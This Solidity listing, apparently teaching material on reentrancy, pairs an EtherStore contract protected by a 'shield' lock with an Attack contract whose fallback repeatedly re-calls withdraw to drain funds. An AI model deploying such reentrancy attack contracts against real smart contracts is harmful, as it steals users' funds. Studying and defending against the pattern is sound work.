contract EtherStore {
// Withdrawal limit = 1 ether / week
    uint constant public WITHDRAWAL_LIMIT = 1 ether;
    mapping(address => uint) public lastWithdrawTime;
    mapping(address => uint) public balances;
    bool shield;
 
    function deposit() public payable {
        balances[ msg.sender] += msg.value;
    }
    
    function withdraw (uint _amount) public {
        require(balances[ msg.sender] >= _amount);
        require(_amount <= WITHDRAWAL_LIMIT);
        require(now >= lastWithdrawTime[ msg.sender] + 1 weeks);
        require(!shield);
        shield = true;
        
        ( bool sent, ) = msg.sender.call{value: _amount}( "");
        require(sent, "Failed to send Ether" );
        
        balances[ msg.sender] -= _amount;
        lastWithdrawTime[ msg.sender] = now;
        shield = false;
    }

// Helper function to check the balance of this contract
    function getBalance () public view returns (uint) {
        return address(this).balance;
        }
    }

contract Attack {
    EtherStore public etherStore;
    
    constructor (address _etherStoreAddress) public {
        etherStore = EtherStore (_etherStoreAddress);
    }
    
    fallback () external payable {
        if (address(etherStore).balance >= 1 ether) {
        etherStore. withdraw (1 ether);
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
    etherStore. withdraw (1 ether);
    }

// Helper function to check the balance of this contract

    function getBalance () public view returns (uint) {
        return address(this).balance;
        }
    }